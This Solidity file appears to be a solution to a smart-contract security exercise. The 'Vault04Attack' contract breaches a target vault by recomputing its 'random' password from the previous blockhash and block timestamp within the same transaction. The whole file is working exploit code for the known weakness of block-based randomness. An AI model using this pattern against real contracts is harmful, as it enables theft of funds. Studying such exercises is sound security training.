// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IVault04 {
    function breachVault(uint256 _password) external returns (bool);
}

contract Vault04Attack {
    IVault04 public vault;

    // Constructor to set the address of the vault contract
    constructor(address _vaultAddress) {
        vault = IVault04(_vaultAddress);
    }

    // Function to perform the attack
    function attack() external returns (bool) {
        // =========================
        // YOUR CODE GOES HERE

        // Compute the guess using on-chain values in the same transaction.
        uint256 guess = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        ) % 100;

        // Call the breachVault function of the vault contract with the computed guess
        return vault.breachVault(guess);
        // =========================
    }
}
